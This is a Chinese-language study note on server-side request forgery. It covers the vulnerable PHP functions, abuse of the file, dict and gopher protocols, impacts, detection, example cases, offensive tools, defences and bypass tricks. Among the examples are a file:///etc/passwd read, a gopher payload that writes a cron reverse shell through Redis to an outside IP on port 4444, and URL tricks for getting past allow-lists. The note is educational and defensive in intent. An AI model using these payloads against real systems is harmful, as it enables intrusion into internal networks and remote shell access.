# SSRF

## 描述

**SSRF (Server-Side Request Forgery)****服务器端**请求伪造, 当我们访问**网站1**的时候进行**某些操作**, 比如我们正在看论文, 感觉这个论文写的非常好, 页面上正好有个下载这篇论文的按钮, 我们点击了, **但是**, 这个按钮的源代码是通过设置了 **某个参数**, **请求了网站2的资源**. 一般请求地址, 都会在浏览器中显示, 比如:

```
https://xxx1.com/url= https://xxx.2.com
```

> 上面这个连接就是在**网站1**下, 通过 `url参数`访问了 **网站2** 

也就是是说, 其实源代码中(或者说程序中), 已经设定了 `url`来访问外部资源, 那么如果构造Payload , **让url参数访问攻击者想要让它访问的资源**, 这不就达到了, 钓鱼,任意读取信息(假如url访问的是你本地资源), 等等危害了吗?

`也就是说, 攻击者并没有直接攻击用户, 而是利用服务器1,达到了目的==========> 用户不知不觉中访问了恶意的网站(攻击者构造的) `



## 实现SSRF的某些函数

> Php

| 函数                | 作用                                   |      |
| ------------------- | -------------------------------------- | ---- |
| curl_exec()         | 执行cURL会话                           |      |
| file_get_contents() | 将这个文件读入字符串                   |      |
| fsockopen()         | 打开一个网络连接或者一个Unix套接字连接 |      |

```php
# curl支持的一些协议

file 协议, 作用: 查看文件, 例如:
curl -v 'file:///etc/passwd'


dict 协议, 作用: 探测端口, 例如:
http://localhost/ssrf/ssrf1.php?url=dict://127.0.0.1:3306

gopher协议, 作用: 反弹shell  (该协议现在用的已经比较少了), 
					 补充: gopher协议是一种只支持文本的信息查找系统, 已被HTTP去取代了
例如:
curl -v
'gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%
0a1%0d%0a$57%0d%0a%0a%0a%0a*/1 * * * * bash -i >&
/dev/tcp/192.168.142.135/4444
0>&1%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%
0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron
/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a
$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$
4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a'
```

## 危害

1. 扫描资产

2. 获取敏感信息

3. 攻击内网服务器, 绕过防火墙(因SSRF攻击的目标是**从外网无法访问的内部系统**, 正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统)

   1. ```shell
      知识点:内网ip
      10.0.0.0/8      10.0.0.0-10.255.255.255
      172.16.0.0/12   172.16.0.0-172.31.255.255
      192.168.0.0/16  192.168.0.0-192.168.255.255
      ```

   

4. 访问大文件造成溢出

5. 通过Redis写入WEbShell或者建立反弹连接

## 常见场景(验证有无)

1. 社会化分享
2. 转码服务
3. 在线翻译
4. 图片加载, 下载功能
5. 图片文章收藏
6. 网站采集, 网站抓取

**平常如何查看有没有SSRF呢? **

1. 因为SSRF漏洞是构造服务器发送请求的漏洞，所以我们**通过抓包分析发送的请求**是否是由服务器发送的来判断是否存在SSRF漏洞；
2. 在页面源代中查找访问的资源地址，如果该资源地址的类型为：`http://www.xxx.com/a.php?param=http(S)://xxx.com/*****`地址的情况下可能会存在SSRF漏洞

`说白了就是看数据包里面真正的请求的地址`

### 整个过程(关键点)

1. 获取用户传递的url参数值 
2. 根据url的参数值发起http,https等请求 
3. 获取页面中title标签内容并返回结果

**接着:**

1. **用户提交（主动或被动）的数据内容被带入到服务器请求指定资源逻辑中**
2. **程序没有对用户提交内容做合理的处理，导致可请求指定资源**

也就是时候这种漏洞能够接触到外网的人接触不到的地方.

具体实现的时候, 可以通过BP 这样查看:

![image-20230604191246324](https://raw.githubusercontent.com/QDGSCLOUD/BJYH_picture/main/img/image-20230604191246324.png)

## 参考案例

[Weblogic 的SSRF](https://www.freebuf.com/vuls/257820.html)

[discuz20160601SSRF](https://f002.backblazeb2.com/file/sec-news-backup/files/writeup/xdxd.love/_2016_10_19_discuz_E6_9C_80_E6_96_B0_E7_89_8820160601_SSRF_E6_BC_8F_E6_B4_9E_E5_88_86_E6_9E_90_/index.html)

[WordPress xmlrpc.php 的SSRF](https://www.eee-eee.com/blog/90-wordpress/1430-wordpress-xmlrpc-php-%E5%AD%98%E5%9C%A8ssrf%E6%BC%8F%E6%B4%9E.html)

## 工具

1. 直至Google语法搜索一些关键字:

   ```
   share、wap、url、link、src、source、target、u、
   3g、display、sourceURL、imageURL、domain
   ```

2. https://github.com/cujanovic/SSRF-Testing

   ```
   https://github.com/cujanovic/SSRF-Testing.git
   ```

   https://github.com/tarunkant/Gopherus

   ```
   https://github.com/tarunkant/Gopherus.git
   ```

   https://github.com/swisskyrepo/SSRFmap

   ```
   https://github.com/swisskyrepo/SSRFmap.git
   ```

## 防御方法

1. 禁用协议
2. 限制请求端口
3. 设置URL白名单
4. 过滤返回信息
5. 统一错误信息



## 绕过方法

# 绕过方法

1. **短域名绕过**#**服务会跟随跳转的情况**，仅验证以验证ip的情况可通过, 例如:

   在线短域名生成网址`https:/www.sojson.com/dwz.html test.com@10.0.0.1#仅从开头匹配域名`

2. **增加端口号绕过部分对ip的匹配,** 例如:

   `baudo.com@ 10.0.0.1:8090     # 实际上, 10.0.1:8090才是真正的请求的地址`

3. 配置可控域名解析到内网ip地址#**仅验证域名是否为企业子域名的情况**, 例如:

   `**www.baidu.com.test.com  =======> 实际上**`**test.com**`**这才是真正的域名, 这种方法可以绕过 @  过滤**`







